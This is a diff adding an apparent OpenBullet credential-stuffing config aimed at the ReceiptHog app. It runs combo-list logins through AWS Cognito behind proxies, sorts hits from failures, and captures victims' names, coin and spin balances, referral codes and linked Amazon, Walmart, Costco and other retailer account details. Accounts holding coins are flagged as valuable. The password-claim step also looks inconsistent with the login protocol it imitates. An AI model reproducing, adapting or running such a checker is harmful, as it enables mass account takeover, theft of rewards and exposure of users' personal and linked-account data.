@@ -1,0 +1,152 @@
+[SETTINGS]
+{
+  "Name": "ReceiptHog iOS Api FullCapture",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-17T22:50:09.2951727+04:00",
+  "AdditionalInfo": "Full Capture | Move free to Custom`",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#B64 FUNCTION Base64Encode "{\"payload\":\"{\"username\":\"<USER>\",\"contextData\":{\"ApplicationVersion\":\"7.5.0-7\",\"HasSimCard\":\"false\",\"PhoneType\":\"iPhone9,1\",\"DeviceId\":\"7ebc361f-8b12-4691-8e9f-46f086c7bdf2\",\"ScreenWidthPixels\":\"750\",\"Platform\":\"iOS\",\"ScreenHeightPixels\":\"1334\",\"ApplicationTargetSdk\":\"90000\",\"ApplicationName\":\"com.infoscoutinc.receipthog\",\"DeviceOsReleaseVersion\":\"15.3.1\",\"DeviceFingerprint\":\"Apple/iPhone/iPhone9,1/-:15.3.1/-/-:-/release\",\"ThirdPartyDeviceId\":\"EC5AE222-F86E-4045-ACAB-94CF28EB6C93\",\"DeviceLanguage\":\"en-CA\",\"ClientTimezone\":\"+04:00\",\"BuildType\":\"release\",\"DeviceName\":\"Yashvir Gaming iPhone\"},\"userPoolId\":\"us-west-2_fKAUQt7OR\",\"timestamp\":\"1647540858610\"}\",\"version\":\"IOS20171114\",\"signature\":\"6/skKn3Nnmc6kRL/g0DufJtwyG9YSdSBfhvaAy571Cs=\"}" -> VAR "B64" 
+
+REQUEST POST "https://cognito-idp.us-west-2.amazonaws.com/" 
+  CONTENT "{\"UserContextData\":{\"EncodedData\":\"<B64>\"},\"ClientMetadata\":{\"cognito:deviceName\":\"Yashvir Gaming iPhone\",\"cognito:bundleShortV\":\"7.5.0\",\"cognito:idForVendor\":\"EC5AE222-F86E-4045-ACAB-94CF28EB6C93\",\"cognito:bundleVersion\":\"7\",\"cognito:bundleId\":\"com.infoscoutinc.receipthog\",\"cognito:model\":\"iPhone\",\"cognito:systemName\":\"iOS\",\"cognito:iOSVersion\":\"15.3.1\"},\"AuthParameters\":{\"SRP_A\":\"2a414ff7e63dda2fbf34253a6e01abef3e3f41a93fe037d3ce89aeeec14e0375bc3f2c5fe521717f3dabbdc412d13fac4de92e0297b9f1253ca7f5831504302ee482ba1a5f37a0c29c54b9f6d4d8a0b01af956aa9948d4b09730c850fc9e4e2b9774ca1b1872157cafa429628468a795499fd4bf55d7f9fe7e8a64b086d7ca584c619c2fa40c09c483f9479ab73887dea773024ba100da6e4942203358c58150d3e2691cbdef268728b03ce2fb85a6dfab8156237139daea33b1384f11066eb3e1617d51cd639e36f04bb1bb701ff6e2d66ffe7768b33de56143bc49e0e884d9ba0eedf9a813430d291514cebd9b0388da9da5e8a6896ac8f39b80aef7018e824d35640d598361439b36ffc8ffab85383d37279fb6396b7a080cb0ad5b0ae60517feb90f4ba205564ac8883c13139a131ef32e684ed86522d301ceac878fffd6dfb9114e55a044e1b86ea7c045c5069c16757bffe0e62d3b070d7d12b0bf8e93ff05be0bf849281d68fb339cc01d26b6cac896579bb7f2530a41e05eba1fa2d0\",\"USERNAME\":\"<USER>\"},\"AuthFlow\":\"USER_SRP_AUTH\",\"ClientId\":\"3lm719nshdi2imbr5pfcjm7ni5\"}" 
+  CONTENTTYPE "application/x-amz-json-1.1" 
+  HEADER "Host: cognito-idp.us-west-2.amazonaws.com" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/x-amz-json-1.1" 
+  HEADER "X-Amz-Target: AWSCognitoIdentityProviderService.InitiateAuth" 
+  HEADER "Accept-Language: en-ca" 
+  HEADER "X-Amz-Date: 20220317T181418Z" 
+  HEADER "User-Agent: amplify-iOS/1.7.2 iOS/15.3.1 en_CA" 
+  HEADER "Content-Length: 2389" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+
+#Salt PARSE "<SOURCE>" LR "\"SALT\":\"" "\"" -> VAR "Salt" 
+
+#SB PARSE "<SOURCE>" JSON "SECRET_BLOCK" -> VAR "SB" 
+
+#SRPB PARSE "<SOURCE>" JSON "SRP_B" -> VAR "SRPB" 
+
+#USERNAME PARSE "<SOURCE>" JSON "USERNAME" -> VAR "USERNAME" 
+
+#UID_SRP PARSE "<SOURCE>" JSON "USER_ID_FOR_SRP" -> VAR "UID_SRP" 
+
+#PS FUNCTION Base64Encode "<PASS>" -> VAR "PS" 
+
+REQUEST POST "https://cognito-idp.us-west-2.amazonaws.com/" 
+  CONTENT "{\"UserContextData\":{\"EncodedData\":\"<B64>\"},\"ChallengeResponses\":{\"PASSWORD_CLAIM_SECRET_BLOCK\":\"<SB>\",\"DEVICE_KEY\":\"us-west-2_1e940c02-e36d-4276-ba8e-12c0d657fce7\",\"USERNAME\":\"<USERNAME>\",\"PASSWORD_CLAIM_SIGNATURE\":\"<PS>\",\"TIMESTAMP\":\"Thu Mar 17 18:14:18 UTC 2022\"},\"ClientMetadata\":{},\"ChallengeName\":\"PASSWORD_VERIFIER\",\"ClientId\":\"3lm719nshdi2imbr5pfcjm7ni5\"}" 
+  CONTENTTYPE "application/x-amz-json-1.1" 
+  HEADER "Host: cognito-idp.us-west-2.amazonaws.com" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/x-amz-json-1.1" 
+  HEADER "X-Amz-Target: AWSCognitoIdentityProviderService.RespondToAuthChallenge" 
+  HEADER "Accept-Language: en-ca" 
+  HEADER "X-Amz-Date: 20220317T181425Z" 
+  HEADER "User-Agent: amplify-iOS/1.7.2 iOS/15.3.1 en_CA" 
+  HEADER "Content-Length: 3343" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "NotAuthorizedException" 
+    KEY "Incorrect username or password." 
+  KEYCHAIN Success OR 
+    KEY "AccessToken" 
+    KEY "{\"AuthenticationResult\":{\"AccessToken\":\"" 
+    KEY "\"IdToken\":\"" 
+    KEY "\"RefreshToken\":\"" 
+
+#TK PARSE "<SOURCE>" JSON "AccessToken" -> VAR "TK" 
+
+REQUEST GET "https://app.receipthog.com/api/v1/mobile-user/<UID_SRP>/" 
+  
+  HEADER "Host: app.receipthog.com" 
+  HEADER "Cookie: mobile_os=IOS; mobile_os_version=15.3.1; mobile_version=7.5.0" 
+  HEADER "Accept: text/plain,application/json" 
+  HEADER "Authorization: Token <TK>" 
+  HEADER "App-Version: 7.5.0" 
+  HEADER "Device-Id: 0dc116413eb0dcdcefe7581cf0d9e0f61acc058f" 
+  HEADER "Locale: en_CA" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-CA;q=1" 
+  HEADER "Mobile-Os: ios" 
+  HEADER "User-Agent: Receipt%20Hog/7 CFNetwork/1329 Darwin/21.3.0" 
+  HEADER "Timezone: Indian/Mauritius" 
+  HEADER "Mobile-Os-Version: 15.3.1" 
+
+#user_id PARSE "<SOURCE>" JSON "user_id" -> VAR "user_id" 
+
+#first PARSE "<SOURCE>" JSON "first_name" -> VAR "first" 
+
+#Fullname PARSE "<SOURCE>" JSON "last_name" CreateEmpty=FALSE -> CAP "Fullname" "<first> " "" 
+
+#created_date PARSE "<SOURCE>" LR "\"created_date\":\"" "T" CreateEmpty=FALSE -> CAP "created_date" 
+
+#referral_code PARSE "<SOURCE>" JSON "referral_code" CreateEmpty=FALSE -> CAP "referral_code" 
+
+#Account_Level PARSE "<SOURCE>" LR "\"level\":{\"level_current\":" "," CreateEmpty=FALSE -> CAP "Account Level" 
+
+#Spin_Balance PARSE "<SOURCE>" JSON "spin_balance" CreateEmpty=FALSE -> CAP "Spin Balance" 
+
+#Coin_Balance PARSE "<SOURCE>" LR "\"account\":{\"coin_balance\":" "," CreateEmpty=FALSE -> CAP "Coin Balance" 
+
+#Amazon_AccInfo PARSE "<SOURCE>" LR "\"amazon\":{\"available\":true,\"account_info\":{" "}}" CreateEmpty=FALSE -> CAP "Amazon AccInfo" 
+
+#Kroger_AccInfo PARSE "<SOURCE>" LR "kroger\":{\"available\":true,\"account_info\":{" "}}" CreateEmpty=FALSE -> CAP "Kroger AccInfo" 
+
+#Instacart_AccInfo PARSE "<SOURCE>" LR "\"instacart\":{\"available\":true,\"account_info\":{" "}}" CreateEmpty=FALSE -> CAP "Instacart AccInfo" 
+
+#Publix_AccInfo PARSE "<SOURCE>" LR "\"publix\":{\"available\":true,\"account_info\":{" "}}" CreateEmpty=FALSE -> CAP "Publix AccInfo" 
+
+#HomeDepot_AccInfo PARSE "<SOURCE>" LR "\"home_depot\":{\"available\":true,\"account_info\":{" "}}" CreateEmpty=FALSE -> CAP "HomeDepot AccInfo" 
+
+#Marianos_Grocery_AccInfo PARSE "<SOURCE>" LR "marianos_grocery\":{\"available\":true,\"account_info\":{" "}}" CreateEmpty=FALSE -> CAP "Marianos Grocery AccInfo" 
+
+#Starbucks_AccInfo PARSE "<SOURCE>" LR "\"starbucks\":{\"available\":true,\"account_info\":{" "}}" CreateEmpty=FALSE -> CAP "Starbucks AccInfo" 
+
+#Cosco_AccInfo PARSE "<SOURCE>" LR "\"costco\":{\"available\":true,\"account_info\":{" "}}" CreateEmpty=FALSE -> CAP "Cosco AccInfo" 
+
+#Meijer_AccInfo PARSE "<SOURCE>" LR "\"meijer\":{\"available\":true,\"account_info\":{" "}}" CreateEmpty=FALSE -> CAP "Meijer AccInfo" 
+
+#Walmart_AccInfo PARSE "<SOURCE>" LR "\"walmart\":{\"available\":true,\"account_info\":{" "}}" CreateEmpty=FALSE -> CAP "Walmart AccInfo" 
+
+#Wallsgreens_AccInfo PARSE "<SOURCE>" LR "\"walgreenscom\":{\"available\":true,\"account_info\":{" "}}" CreateEmpty=FALSE -> CAP "Wallsgreens AccInfo" 
+
+#AUTHOR FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By " 
+
+#CHECK_COINS KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Coin Balance>" EqualTo "0" 
+  KEYCHAIN Success OR 
+    KEY "<Coin Balance>" GreaterThan "1" 
+
